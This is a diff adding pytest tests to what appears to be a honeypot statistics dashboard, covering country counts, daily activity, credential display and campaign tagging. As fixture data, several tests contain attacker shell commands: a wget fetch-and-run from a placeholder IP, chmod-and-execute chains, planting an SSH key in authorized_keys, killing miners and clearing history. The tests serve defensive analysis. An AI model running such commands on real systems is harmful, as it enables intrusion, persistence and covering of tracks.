@@ -205,4 +205,125 @@ def test_dashboard_data_has_no_attacker_ips_or_commands(tmp_path):
         for cmd in s["commands"]:
             assert json.dumps(cmd)[1:-1] not in text
     assert data["history"][0]["attacker_ips"] is None  # blank history cells become null, not a crash
-    assert [f["tier"] for f in data["funnel"]] == ["Scan", "Login attempt", "Access", "Hands-on"]
+    assert data["funnel"] == {"connections": 4, "scans": 1, "tried_login": 3, "shell": 1}
+
+
+# ---------------------------------------------------------------- dashboard aggregations
+
+def test_countries_count_unique_ips_and_keep_sessions(tmp_path):
+    events = [ev(f"n{i}", BOT, "cowrie.login.success", username="a", password="a") for i in range(5)]
+    events += [ev("o1", BRUTER, "cowrie.login.success", username="a", password="a"),
+               ev("o2", "198.51.100.9", "cowrie.login.success", username="a", password="a")]
+    write_log(tmp_path, events)
+    s = stats.load_sessions(tmp_path, set())
+    m = stats.summarize(s, geo={BOT: "Noisyland", BRUTER: "Quietland", "198.51.100.9": "Quietland"},
+                        today="2026-11-06")
+    assert m["_countries"] == {"Quietland": 2, "Noisyland": 1}       # unique IPs: the noisy bot is one IP
+    assert m["_country_sessions"] == {"Noisyland": 5, "Quietland": 2}
+
+
+def test_daily_activity_is_per_day_not_cumulative_and_fills_quiet_days(tmp_path):
+    events = [ev("d1", BOT, "cowrie.login.success", ts="2026-11-06T01:00:00Z", username="a", password="a"),
+              ev("d2", BOT, "cowrie.login.success", ts="2026-11-06T02:00:00Z", username="a", password="a"),
+              ev("d3", BOT, "cowrie.login.success", ts="2026-11-08T01:00:00Z", username="a", password="a"),
+              ev("d4", BRUTER, "cowrie.login.success", ts="2026-11-08T01:00:00Z", username="a", password="a")]
+    write_log(tmp_path, events)
+    m = stats.summarize(stats.load_sessions(tmp_path, set()), geo={}, today="2026-11-08")
+    assert m["_daily"] == [{"date": "2026-11-06", "sessions": 2, "new_ips": 1},
+                           {"date": "2026-11-07", "sessions": 0, "new_ips": 0},
+                           {"date": "2026-11-08", "sessions": 2, "new_ips": 1}]   # BOT isn't new on the 8th
+
+
+def test_blank_credentials_display_as_blank():
+    assert stats.cred("admin", "") == "admin / (blank)"
+    assert stats.cred("", "") == "(blank) / (blank)"
+    assert stats.cred("root", "x|y") == "root / x¦y"   # still sanitized
+
+
+def test_campaign_tags_are_fixed_labels():
+    assert stats.campaign_tags("cd /tmp\nwget <url> -O a; chmod +x a; ./a") == ["downloads payload",
+                                                                                 "makes file executable"]
+    assert stats.campaign_tags("echo ssh-rsa AAA >> ~/.ssh/authorized_keys") == ["adds SSH key"]
+    assert stats.campaign_tags("pkill -9 xmrig; history -c")[:2] == ["kills competing miners", "removes logs"]
+    assert stats.campaign_tags("uname -s -v -n -r -m") == ["recon only"]
+    assert stats.campaign_tags("echo xsec") == ["tests the shell"]
+    assert len(stats.campaign_tags("authorized_keys wget <url> passwd crontab history -c chmod +x")) == 3
+    hunt = "".join(f">/{d}/.f && chmod 777 /{d}/.f && /{d}/.f\n" for d in ("tmp", "var", "dev"))
+    assert stats.campaign_tags("enable\nsystem\nshell\n" + hunt + "/bin/busybox HISILICON") == [
+        "hunts for writable folder", "makes file executable", "escapes restricted shell"]
+    assert stats.campaign_tags("To: <sip:nm2@nm2>") == ["probes for VoIP (SIP)"]
+
+
+def test_campaign_details_have_dates_sizes_and_no_commands(tmp_path):
+    cmd = "wget http://203.0.113.50/x.sh; sh x.sh"
+    events = []
+    for i, (ip, ts) in enumerate([(BOT, "2026-11-06T01:00:00Z"), (BOT, "2026-11-07T01:00:00Z"),
+                                  (BRUTER, "2026-11-09T01:00:00Z")]):
+        events += [ev(f"c{i}", ip, "cowrie.login.success", ts=ts, username="a", password="a"),
+                   ev(f"c{i}", ip, "cowrie.command.input", ts=ts, input=cmd)]
+    write_log(tmp_path, events)
+    m = stats.summarize(stats.load_sessions(tmp_path, set()), geo={}, today="2026-11-09")
+    [c] = m["_campaign_details"]
+    assert (c["ips"], c["sessions"], c["first_seen"], c["last_seen"]) == (2, 3, "2026-11-06", "2026-11-09")
+    assert c["tags"] == ["downloads payload"]
+    assert "wget" not in json.dumps(c) and "203.0.113.50" not in json.dumps(c)
+
+
+def test_samples_include_uploads_and_skip_empty_and_tiny_files(tmp_path):
+    big, tiny = "cd" * 32, "ef" * 32
+    events = [ev("u1", BOT, "cowrie.session.file_upload", shasum=big, filename="sshd"),
+              ev("u2", BRUTER, "cowrie.session.file_download", ts="2026-11-07T00:00:00Z", url="http://h/b", shasum=big),
+              ev("u3", BOT, "cowrie.session.file_upload", shasum=stats.EMPTY_SHA256, filename="x"),
+              ev("u4", BOT, "cowrie.session.file_download", url="", shasum=tiny)]
+    write_log(tmp_path, events)
+    sizes = {big: 200_000, tiny: 5}
+    m = stats.summarize(stats.load_sessions(tmp_path, set()), geo={}, today="2026-11-07", sizes=sizes)
+    assert m["samples"] == 1
+    [row] = m["_sample_details"]
+    assert (row["sha256"], row["sessions"], row["ips"], row["size"], row["first_seen"]) == \
+        (big, 2, 2, 200_000, "2026-11-06")
+
+
+def test_parse_sample_sizes_ignores_non_hash_files():
+    listing = f"{'ab' * 32} 1234\nredir_89026b51 1\n{'zz' * 32} 5\n{'cd' * 32} notanumber\n"
+    assert stats.parse_sample_sizes(listing) == {"ab" * 32: 1234}
+
+
+def test_country_code_to_atlas_id_mapping():
+    assert stats.atlas_id("NL") == "528"
+    assert stats.atlas_id("us") == "840"
+    assert stats.atlas_id("FR") == "250"   # France and Norway are the classic Natural Earth id traps
+    assert stats.atlas_id("NO") == "578"
+    assert stats.atlas_id("TW") == "158"
+    assert stats.atlas_id("XK") is None    # Kosovo has no ISO numeric code (and no atlas id)
+    assert stats.atlas_id("") is None
+
+
+def test_every_atlas_country_is_reachable_from_an_iso_code():
+    atlas = json.loads((stats.REPO / "docs" / "vendor" / "countries-110m.json").read_text(encoding="utf-8"))
+    atlas_ids = {g["id"] for g in atlas["objects"]["countries"]["geometries"] if "id" in g}
+    assert len(atlas_ids) >= 170
+    assert atlas_ids <= set(stats.ALPHA2_TO_NUMERIC.values())
+
+
+def test_dashboard_country_rows_carry_atlas_ids(tmp_path):
+    m = stats.summarize(sessions_from(tmp_path), geo={BOT: "Netherlands", BRUTER: "Kosovo"},
+                        codes={"Netherlands": "NL", "Kosovo": "XK"}, today="2026-11-06")
+    rows = {c["name"]: c for c in stats.render_dashboard(m, [])["countries"]}
+    assert rows["Netherlands"]["atlas_id"] == "528" and rows["Netherlands"]["ips"] == 1
+    assert rows["Kosovo"]["atlas_id"] is None   # listed, just not drawn on the map
+
+
+def test_rare_techniques_are_flagged_not_common(tmp_path):
+    m = stats.summarize(sessions_from(tmp_path), geo={}, today="2026-11-06")
+    techs = {t["id"]: t for t in stats.render_dashboard(m, [])["techniques"]}
+    assert techs["T1078"]["common"] is True and techs["T1078"]["meaning"]
+    assert techs["T1105"]["common"] is False
+
+
+def test_daily_activity_leaves_out_the_day_in_progress(tmp_path):
+    events = [ev("p1", BOT, "cowrie.login.success", ts="2026-11-06T01:00:00Z", username="a", password="a"),
+              ev("p2", BRUTER, "cowrie.login.success", ts="2026-11-07T01:00:00Z", username="a", password="a")]
+    write_log(tmp_path, events)
+    attackers = list(stats.load_sessions(tmp_path, set()).values())
+    assert [d["date"] for d in stats.daily_activity(attackers, before="2026-11-07")] == ["2026-11-06"]
